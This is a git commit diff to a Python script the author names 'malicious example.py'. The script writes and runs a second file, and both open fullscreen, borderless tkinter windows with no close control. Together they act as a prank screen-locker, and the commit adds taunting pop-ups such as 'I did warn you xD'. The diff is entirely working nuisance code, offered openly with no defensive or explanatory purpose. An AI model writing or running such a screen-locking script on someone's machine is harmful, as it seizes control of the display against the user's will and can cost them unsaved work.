69c2c430664032b8ef0f54fc38fe4aaf72fc9272
redninja9854 <100790587+redninja9854@users.noreply.github.com>
2022-05-25 19:46:42 +0100

    Improved example
    Added pop-up messages.

--- malicious example.py
+++ malicious example.py
@@ -1,9 +1,11 @@
 import os
 import tkinter as tk
+from tkinter.messagebox import showinfo
 with open ("test.py", "w") as file:
-    file.write("import os\nimport tkinter as tk\nfullscreen = tk.Tk()\nfullscreen.attributes(\"-fullscreen\", True)\nfullscreen.overrideredirect(True)\nfullscreen.mainloop()")
+    file.write("import os\nimport tkinter as tk\nfrom tkinter.messagebox import showinfo\nfullscreen = tk.Tk()\nshowinfo(message=\"I did warn you xD\")\nfullscreen.attributes(\"-fullscreen\", True)\nfullscreen.overrideredirect(True)\nfullscreen.mainloop()")
 os.system("test.py")
 fullscreen = tk.Tk()
+showinfo(message="why?")
 fullscreen.attributes("-fullscreen", True)
 fullscreen.overrideredirect(True)
 fullscreen.mainloop()
